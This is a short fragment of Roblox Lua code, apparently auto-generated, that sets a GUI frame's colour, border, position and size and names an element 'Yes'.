Frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.0168942045, 0, 0.031152634, 0)
Frame.Size = UDim2.new(0, 257, 0, 98)

Yes.Name = "Yes"
